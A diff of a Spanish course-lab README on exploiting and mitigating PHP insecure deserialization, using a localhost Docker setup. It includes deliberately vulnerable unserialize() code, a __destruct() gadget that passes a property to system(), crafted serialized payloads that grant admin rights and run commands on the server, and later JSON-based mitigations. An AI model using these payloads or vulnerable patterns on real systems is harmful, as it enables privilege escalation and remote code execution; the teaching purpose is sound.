@@ -1,7 +1,9 @@
 # PPS-Unidad3Actividad-DeserializacionInsegura_Angel
-Explotación y Mitigación de vulnerabilidad de Deserialización Insegura 
 
-Objetivos:
+Esta actividad corresponde a la Unidad 3 de Puesta en Producción Segura. En esta actividad vamos a trabajar con **eplotación y mitigación de vulnerabilidad de deserialización insegura** 
+
+
+## Objetivos:
 
 * Comprobar cómo se pueden realziar ataques de Deserialización insegura.
 
@@ -33,7 +35,7 @@ Manipulación de la lógica de la aplicación: El atacante puede alterar el comp
 
 ## Actividades
 
-- Leer la sección de vulnerabilidades de subida de archivos de la página de __PortWigger__ <https://portswigger.net/web-security/deserialization>
+- Leer la [sección de vulnerabilidades de subida de archivos de la página de __PortWigger__](https://portswigger.net/web-security/deserialization)
 
 - Leer el [documento sobre Explotación y Mitigación de ataques de Remote Code Execution](./files/ExplotacionYMitigacionDeserializacionInsegura.pdf)
 
@@ -81,7 +83,6 @@ if (isset($_GET['data'])) {
 
 ```
 
-![](Images/img1.png)
 
 A su vez, creamos un archivo llamado **GenerarObjeto.php** para poder visualizar los datos serializados y mostrar así un enlace al archivo MostrarObjeto.php. 
 
@@ -142,8 +143,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 </html>
 ```
 
-![](Images/img2.png)
-
 Esto nos permite:
 
 - Crear objetos User con isAdmin= true o false.
@@ -153,12 +152,14 @@ Esto nos permite:
 - Verificar directamente el exploit en el script MostrarObjeto.php (o el que verifica isAdmin).
 
 
+![](Images/img3.png)
 
 
 A continuación, comprobamos como queda el objeto serializado:
 
-`O:4:"User":2:{s:8:"username";s:4:"Raul";s:7:"isAdmin";b:0;}`
-
+```
+O:4:"User":2:{s:8:"username";s:4:"Raul";s:7:"isAdmin";b:0;}
+```
 
 Esto nos dará el enlace para probarlo, por lo que lo enviamos a MostrarObjeto.php
 
@@ -171,69 +172,45 @@ Vemos cómo podemos preparar la ruta para mostrar el objeto serializado conectan
 `http://localhost/MostrarObjeto.php?data=` con el objeto serializado, en este caso: `O:4:"User":2:{s:8:"username";s:4:"Raul";s:7:"isAdmin";b:0;}`
 
 
-![](Images/img.png)
+![](Images/img4.png)
 
+![](Images/img5.png)
 
 ---
-
 
 ##  Explotación de Deserialización Insegura
 
 A la hora de intercambiar objetos entre diferentes módulos, pasamos el objeto serializado. Esto lo pueden usar atacantes para envair a nuestros códigos PHP la serialización modificada.
 
-**Crear un objeto malicioso en PHP**
+## Crear un objeto malicioso en PHP
 
+![](Images/img4.png)
 
-
-
-
-
-
-echo "El servidor ha sido hackeado" > /var/www/html/ServidorHackeado.tmp
-
-
-si da error capturas 12 y 13 es por http://localhost/MostrarObjeto.php?data=O%3A4%3A%22User%22%3A3%3A{s%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A0%3Bs%3A3%3A%22cmd%22%3Bs%3A21%3A%22ls+-l+%2Ftmp%2Foutput.txt%22%3B}
-
-quitar mostrarobjeto1 y poner mostrarobjeto
-
-
-----------------------------------------------------------
-
-
-
-**Crear un objeto malicioso en PHP**
-
-![](images/UD5.png)
-
-Como podemos ver, del enlace generado, cualquier persona puede saber, el nombre del tipo de objetos, variables y valores que tienen.
-
+En la anterior captura, comprobamos que del enlace generado, cualquier persona puede saber el nombre del tipo de objetos, variables y valores que tienen.
 Por ejemplo, el usuario Raul podría:
 
+__1 - Modificar la serialización.__
 
-**1 - Modificar la serialización.**
-
-El objeto serializado es: 
-
-~~~
-MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A**0**%3B%7D
-~~~
+El objeto serializado es: "MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A**0**%3B%7D"
 
 Podemos cambiar los datos del valor IsAdmin:
 
-~~~
-MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A**1**%3B%7D 
-~~~
+```
+MostrarObjeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A**1**%3B%7D
+```
 
-![](images/UD6.png)
+![](Images/img7.png)
+
+Con esto, Raul podría haber cambiado su estado y convertirse en administrador.
 
 Raul podría haber cambiado su estado, convirtiéndose en administrador.
 
 
-**2 - Crear un archivo para crear la serialización con los datos que se deseen.**
+**2 - Crear un archivo para crear la serialización con los datos que se queramos.**
 
-Crear el archivo **HackerAdmin.php**  y ejecutar este código en la máquina atacante:
+Crear el archivo __HackerAdmin.php__  y ejecutar este código en la máquina atacante:
 
-~~~
+```
 <?php
 class User {
 	public $username = "hacker";
@@ -241,43 +218,29 @@ class User {
 }
 echo urlencode(serialize(new User()));
 ?>
-~~~
+```
 
 Salida esperada (ejemplo):
 
-~~~
+```
 O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22hacker%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A1%3B%7D
-~~~
+```
 
-Este objeto serializado podemos usarlo para enviarlo a MostrarObjeto.php y así hacker sería administrador.
+Este objeto serializado podemos usarlo para enviarlo al archivo MostrarObjeto.php y así "hacker" sería administrador.
 
-![](images/UD6.png)
-
-
-- Copiar la salida obtenida
-
-- Acceder a esta URL en el navegador `http://localhost/MostrarObjdeto.php?data=` y concatenarla con el código obtenido:
+![](Images/img8.png)
 
 
-Al mandarlo, tendríamos el mismo resultado, Hacker se convierte en `Admin`.
+---
 
 
-~~~
-http://localhost/MostrarObjdeto.php?data=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22hacker%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A1%3B%7D
-~~~
+__Intentar RCE con __destruct()__
 
+En el caso de que la clase **User** tenga el método __destruct()__, podemos ejecutar código en el servidor, este es el __mayor riesgo al explotar la deserialización__.
 
-![](images/UD2.png)
+Para comprobarlo creamos el fichero __GenerarObjeto1.php__
 
-
-**Intentar RCE con __destruct()**
-
-Si la clase User tiene un método **__destruct()**, se puede abusar para ejecutar código en el servidor. Este es el riesgo mayor al explotar la deserialización.
-
-Aquí tenemos nuestra clase modificada con **Destruct()**. Crea el fichero **GenerarObjeto1.php**
-
-
-~~~
+```
 <?php
 class User {
     public $username;
@@ -337,18 +300,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <?php endif; ?>
 </body>
 </html>
+```
 
-~~~
+Este código incluye los siguientes cambios:
 
-Este cambio introduce:
+- Una propiedad llamada __$cmd__ que contendrá un comando que se va a ejecutar.
 
-- Una nueva propiedad **$cmd** que contendrá el comando a ejecutar.
+- El método __destruct()__ que se activa automáticamente al final del script (cuando el objeto es destruido), así podemos ver mejor la explotación por deserialización.
 
-- El método **__destruct()** que se dispara automáticamente al final del script (cuando el objeto es destruido), lo que lo hace perfecto para ilustrar la explotación por deserialización.
 
-Vamos a modificar el objeto malicioso para introducir un código a ejecutar. El atacante de esta manera, podría serializar el objeto introduciendo un código para ejecutar en nuestro servidor, Este archivo lo llamo **explotarGenerarObjeto1.php**:
+El atacante podría serializar el objeto incluyendo código para ejecutar en nuestro servidor.
+A continuación, vamos a modificar el objeto malicioso para incluir un código a ejecutar, creamos un archivo llamado __explotarGenerarObjeto1.php__:
 
-~~~
+```
 <?php
 class User {
     public $username;
@@ -357,7 +321,7 @@ class User {
 
     public function __destruct() {
         if (!empty($this->cmd)) {
-            // ⚠️ Ejecución insegura de código del sistema
+            // ***** Cuidado ejecución insegura de código del sistema ******
             echo "<pre>Ejecutando comando: {$this->cmd}\n";
             system($this->cmd);
             echo "</pre>";
@@ -414,61 +378,78 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <?php endif; ?>
 </body>
 </html>
-~~~
+```
 
-🧪 Para la prueba
+### Para realizar la prueba debemos:
 
-1. Marca "Sí" en la opción de administrador.
+1. Marcar "__Sí__" en la opción de administrador
 
-2. Escribe un comando como **whoami, ls -l, id**, etc.
+2. Escribir un comando, como __ls -l, id, etc...__
 
-3. Se serializa el objeto incluyendo ese comando.
+3. El objeto se serializa incluyendo el comando introducido.
 
-4. Al deserializarlo en **MostrarObjeto.php**, se ejecuta automáticamente en el **__destruct(**).
+4. Al deserializarlo en __MostrarObjeto.php__, se ejecuta automática en el __destruct()__.
 
-![](images/UD7.png)
+Probamos con:
 
-El atacante habría inyectado en la serialización la ejecución del comando `ls -l /tmp/output.txt`pero podría haber sido cualquier otro comando.
+```
+__echo "El servidor ha sido hackeado" > /var/www/html/ServidorHackeado.tmp"__
+```
 
-![](images/UD8.png)
+![](Images/img11.png)
 
-Vemos en el resultado que la ejecución no parece anómalo, pero veamos que ha pasado en el servidor.
+![](Images/img12.png)
 
-![](images/UD9.png)
 
-Veamos que contiene el archivo `/tmp/output.txt`. 
+Ahora, probamos con:
 
-Como nosotros extamos usando docker, o bien entramos dentros del servidor apacher y vemos el archivo, o ejecutamos el siguiente comando docker para que nos lo muestre:
+```
+__ls -l > /tmp/output.txt__
+```
 
-~~~
+![](Images/img13.png)
+
+```
+http://localhost/MostrarObjeto.php?data=O%3A4%3A%22User%22%3A3%3A{s%3A8%3A%22username%22%3Bs%3A4%3A%22Raul%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A0%3Bs%3A3%3A%22cmd%22%3Bs%3A21%3A%22ls+-l+%2Ftmp%2Foutput.txt%22%3B}
+```
+
+![](Images/img14.png)
+
+
+Vamos a ver el contenido del archivo `/tmp/output.txt`, en nuestro caso usando docker, podemos entrar y ver el archivo o ejecutar el siguiente comando
+
+```
 docker exec -it lamp-php83 /bin/bash -c 'cat /tmp/output.txt'
-~~~
+```
 
-![](images/UD10.png)
+![](Images/img15.png)
 
-Como vemos, hemos podido ejecutar comandos dentro del servidor. En este caso con el usuario **www-data**, pero si lo combinamos con otros ataques como escalada de privilegios, podríamos haber ejecutado cualquier comando.
+Concluimos así verificando que podemos ejecutar comandos dentro del servidor. En este caso ha sido con el usuario __www-data__, pero si lo combinasemos con otros ataques, como escalada de privilegios, podríamos haber ejecutado cualquier comando teniendo más acceso.
+
+---
 
 ## Mitigación de Unsafe Deserialization
----
 
 ### ¿Cómo Validar los datos?
 
-Si queremos mitigar realmente ese problema (que no se puedan añadir propiedades inesperadas), una estrategia efectiva es usar la interfaz **Serializable** o **__wakeup()** junto con la visibilidad privada o protegida de las propiedades, y una validación explícita del contenido deserializado.
+Si queremos mitigar el problema (no se pueden añadir propiedades inesperadas), se puede usar la interfaz __Serializable__ o __wakeup()__ junto con la visibilidad privada o protegida de las propiedades, y una validación explícita del contenido deserializado.
+
+Para realizarlo vamos a crear el archivo __MostrarObjeto1.php__:
+
+El siguiente código:
+
+- Continúa usando __unserialize()__ (lo usamos únicamente para propósitos educativos, no debe usarse en entorno real).
+
+- Valida que el objeto sea de la clase que se espera.
+
+- Valida que las propiedades estén bien formadas (por tipo y existencia).
+
+- Permite ver el riesgo de __destruct()__ si no se valida bien.
 
 
-Este código:
+El contenido de __MostrarObjeto1.php__ es:
 
-- Aún usa **unserialize()** (sólo lo usamos para propósitos educativos, no debe usarse en un entorno real).
-
-- Valida que el objeto es de la clase esperada.
-
-- Valida que las propiedades están bien formadas (por tipo y existencia).
-
-- Aún permite ver el riesgo de __destruct() si no se valida bien.
-
-Para ello creamos el archivo **MostrarObjeto1.php**:
-
-~~~
+```
 <?php
 class User {
     public $username;
@@ -539,57 +520,51 @@ if (isset($_GET['data'])) {
 } else {
     echo "No se proporciona ningún dato.";
 }
-~~~
-
-
+```
 
 Esta versión:
 
 - Usa propiedades privadas.
 
-- Implementa la interfaz **Serializable**.
+- Implementa la interfaz __Serializable__.
 
 - Valida los datos antes de restaurarlos.
 
 - Impide que se inyecten propiedades no autorizadas.
 
 
+### Explicación de la Validación de Claves
 
-**Explicación de la Validación de Claves**
----
+```
+http://localhost/MostrarObjeto1.php?data={"username":"hacker","isAdmin":true, "bypass":"0"}
+```
 
-~~~
-http://localhost/deserialize_full.php?data={"username":"hacker","isAdmin":true, "bypass":"0"}
-~~~
+Si se detecta un parámetro no permitido, muestra el error:
 
-Si se detecta un parámetro no permitido (bypass en este caso), se muestra el error:
+![](Images/img17.png)
 
-`Error: Clave inválida detectada`
+Esto mejora:
 
-![](images/UD12.png)
-
-
-✅ ¿Qué mejora esta versión?
-
-- No se pueden inyectar propiedades personalizadas, ya que solo se deserializa lo que explícitamente se espera.
+- Que no se puedan inyectar propiedades personalizadas, debido a que deserializa lo que explícitamente espera.
 
 - No hay ejecución de comandos.
 
-- Control total de cómo se deserializa el objeto.
+- Control total de cómo se deserializa el objeto
 
 
-### Utilizando JSON 
 ---
 
-La mejor forma de evitar ataques de deserialización insegura es no usar **unserialize()** con datos externos.
+### Utilizando JSON 
 
-Usar *JSON* en lugar de **serialize()**.
+La mejor manera de evitar ataques de deserialización insegura es no usar el método __unserialize()__ con datos externos.
 
-Además, si quieresmos reforzar aún más la seguridad, podemos comprobar que las claves que pasamos són únicamente las claves permitidas, así que corresponden con los tipos de datos que deberían. 
+Usando __JSON__ en lugar de __serialize()__ 
 
-✅ Creamos el archivo **MostrarObjetoJson.php**:
+Podemos reforzar más la seguridad, comprobando que las claves que pasamos son únicamente las claves permitidas, así corresponde con los tipos de datos que deberían.
 
-~~~
+Creamos el archivo __MostrarObjetoJson.php__:
+
+```
 <?php
 class User {
     private $username;
@@ -650,11 +625,11 @@ if (isset($_GET['data'])) {
 } else {
     echo "No se proporciona ningún dato.";
 }
-~~~
+```
 
-Vamos a crear también el archivo **GenerarObjetoJson.php** que nos creará un objeto JSON Alumno que es administrador:
+A su vez, creamos también el archivo __GenerarObjetoJson.php__, este creará un objeto JSON alumno que sea administrador:
 
-~~~
+```
 <?php
 $data = [
     "username" => "alumno",
@@ -662,46 +637,51 @@ $data = [
     "cmd" => "id" // esto no se ejecutará, solo se mostrará como texto
 ];
 echo urlencode(json_encode($data));
+```
 
-~~~
-🧪 Cómo probarlo
+### Verificación
 
-- Acceder al php de generación de JSON:
+Accedemos al JSON que hemos creado:
 
-~~~
+```
 http://localhost/GenerarObjetoJson.php
-~~~
+```
 
-- Objetnemos el JSON:
+Obtenemos el JSON:
 
-~~~
+```
 %7B%22username%22%3A%22alumno%22%2C%22isAdmin%22%3Atrue%2C%22cmd%22%3A%22id%22%7D
-~~~
+```
 
-- Concatenar el JSON con la url de MostrarObjetoJson.php
+![](Images/img20.png)
 
-~~~
+A continuación, concatenamos el JSON con la url de MostrarObjetoJSON.php
+
+```
 http://localhost/MostrarObjetoJson.php?data=%7B%22username%22%3A%22alumno%22%2C%22isAdmin%22%3Atrue%2C%22cmd%22%3A%22id%22%7D
-~~~
+```
 
-La ejecución solo se permitirá si los datos contienen exclusivamente **username** y **isAdmin**.
+La ejecución sólo se realizará si los datos contienen exclusivamente __username__ y __isAdmin__.
 
-Ahora nos muestra los datos que hemos introducido. Incluso si hemos intentado introducir un comando para explotar, nos muestra sólo el cómando, no lo ejecuta:
+![](Images/img21.png)
 
-![](images/UD13.png)
+Ahora vamos a modificar __MostrarObjetoJson.php__  para que no esté incluído el comando:
 
-- Y si probamos  modificando **MostrarObjetoJson.php** para que no esté incluído el comando:
-
-~~~
+```
 class User {
     private $username;
     private $isAdmin = false;
-~~~
+```
 
+![](Images/img22.png)
 
-- Si quieres puedes utilizar el siguiente código  para crear el objeto de forma interactiva, nos mostrará el enlace a **MostrarObjetoJson.php** con el objeto.
+(Se me olvidó quitarlo de abajo también)
 
-~~~
+---
+
+Vamos a crear un archivo llamado __GenerarObjetoJson2.php__ para crear un objeto de manera interactiva y __MostrarObjetoJson.php__ nos mostrará el objeto:
+
+```
 <!DOCTYPE html>
 <html>
 <head>
@@ -753,12 +733,11 @@ class User {
 </body>
 </html>
 
-~~~
-![](images/UD14.png)
+```
 
-✅ Ventajas de usar JSON
+Al usar JSON tenemos las siguientes ventajas:
 
-- No crea objetos automáticamente, por lo que no hay métodos mágicos como **__destruct()** que se ejecuten.
+- No creamos objetos automáticamente, por lo que no se ejecutan métodos como __destruct()__.
 
 - Es más legible y portable entre lenguajes.
 
@@ -766,34 +745,22 @@ class User {
 
 - Validación explícita de los datos, sin riesgo de objetos maliciosos.
 
-➡️  Al intentar introducir otros atributos dentro del objeto **user** otros datos:
-~~~
-<?php
-$data = [
-  "username"=> "pepe",
-  "isAdmin" => false,
-  "cmd" => "id",
-  "extra" => "soy malo 😈"
-];
-echo urlencode(json_encode($data));
-~~~
+---
 
-Tendremos unos datos codificados,  por lo que para probar, tendríamos el siguiente enlace:
- 
-~~~
+Al intentar introducir otros atributos dentro del objeto __user__ otros datos:
+
+![](Images/img26.png)
+
+
+```
 http://localhost/MostrarObjetoJson.php?data=%7B%22username%22%3A%22alumno%22%2C%22isAdmin%22%3Atrue%2C%22cmd%22%3A%22id%22%7D
-~~~
+```
 
 Ahora vemos como nos da error en el caso de que intentemos meter los objetos serializados en vez de mandarlos en forma de JSON.
 
-![](images/UD15.png)
+![](Images/img27.png)
 
-El código no lo detecta como inválido
-
-🚀 **Conclusiones**
-
-Usar JSON en lugar de **serialize()/unserialize()** es una de las mejores formas de evitar la deserialización insegura, ya que **JSON** solo representa datos, no objetos con métodos o comportamientos.
-
+Podemos concluir que usar JSON en lugar de __serialize()/unserialize()__ es de las mejores formas de evitar la deserialización insegura, ya que __JSON__ solo representa datos, no objetos con métodos o comportamientos.
 
 
 
